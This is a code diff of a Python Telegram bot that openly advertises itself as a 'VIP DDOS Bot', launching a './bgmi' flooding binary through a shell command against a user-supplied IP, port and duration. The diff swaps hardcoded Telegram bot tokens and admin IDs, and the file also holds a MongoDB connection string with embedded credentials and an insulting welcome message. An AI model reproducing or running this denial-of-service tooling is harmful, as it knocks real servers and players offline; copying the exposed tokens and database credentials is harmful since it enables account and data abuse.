@@ -4,8 +4,8 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, CallbackContext
 from motor.motor_asyncio import AsyncIOMotorClient
 
-TELEGRAM_BOT_TOKEN = '7651280704:AAG8E5rEQkxYLAaNGTc6G6WvHKDAEeoM1XM'
-ADMIN_USER_ID = 7509496491
+TELEGRAM_BOT_TOKEN = '7387777379:AAH2xoCqonATQsxFpxNv7Du0H4e_NjeWBsE'
+ADMIN_USER_ID = 5660031361
 MONGO_URI = "mongodb+srv://Kamisama:Kamisama@kamisama.m6kon.mongodb.net/"
 DB_NAME = "dake"
 COLLECTION_NAME = "users"
@@ -36,7 +36,6 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-         "*   owner name @LDX_COBRA\n
         "*🔥 Oye Chutiye! Welcome to ANURAG VIP DDOS Bot! 🔥*\n\n"
         "*Use /help Kyu Ki Tumko Toh Kuch Aata Nahi😂*\n"
         "*Aur haan, hacker banne ka sapna dekhna band kar aur ab drama shuru kar! ⚔️💥*"
@@ -118,7 +117,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} {1000} 800"
+        command = f"./bgmi {ip} {port} {duration} {512} 800"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
